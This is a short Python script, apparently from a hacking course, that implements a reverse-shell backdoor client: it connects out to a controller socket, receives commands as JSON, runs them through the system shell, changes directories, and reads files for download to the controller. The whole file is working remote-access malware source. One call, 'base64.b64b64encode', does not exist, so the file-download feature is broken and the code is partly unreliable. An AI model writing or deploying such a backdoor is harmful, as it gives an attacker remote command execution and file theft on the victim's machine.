#!/usr/bin/env python

import socket, subprocess, json, os, base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_sys_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_files(self, path):
        with open(path, "rb") as file:
            return base64.b64b64encode(file.read())

    def run(self):
        while True:
            try:
                command = self.reliable_receive()
                if command[0] == "exit":    # If exit command was sent from the server, end the connection
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:   # change directory if command cd is sent from the server
                    command_response = self.change_working_directory(command[1])
                elif command[0] == "download":  # read the file to download by calling the read_files method
                    command_response = self.read_files(command[1])
                else:
                    command_response = self.execute_sys_command(command)    # Execute all other commands normally

                self.reliable_send(command_response)
            except KeyboardInterrupt:
                pass

        self.connection.close()

if __name__ == "__main__":
    my_backdoor = Backdoor("localhost", 8080)
    my_backdoor.run()
